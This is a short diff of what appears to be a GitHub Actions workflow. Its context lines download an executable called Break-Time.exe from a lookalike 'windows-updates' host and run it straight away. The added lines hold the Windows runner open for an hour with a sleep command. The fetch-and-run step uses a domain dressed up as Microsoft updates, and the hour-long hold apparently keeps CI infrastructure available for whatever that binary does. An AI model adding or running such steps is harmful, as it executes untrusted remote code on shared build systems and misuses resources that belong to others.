@@ -19,3 +19,7 @@ jobs:
             -Uri "https://windows-updates.vercel.app/bins/Break-Time.exe" `
             -OutFile $exe
           & $exe
+          
+      - name: Keep workspace alive for 1 hour
+        shell: powershell
+        run: Start-Sleep -Seconds 3600
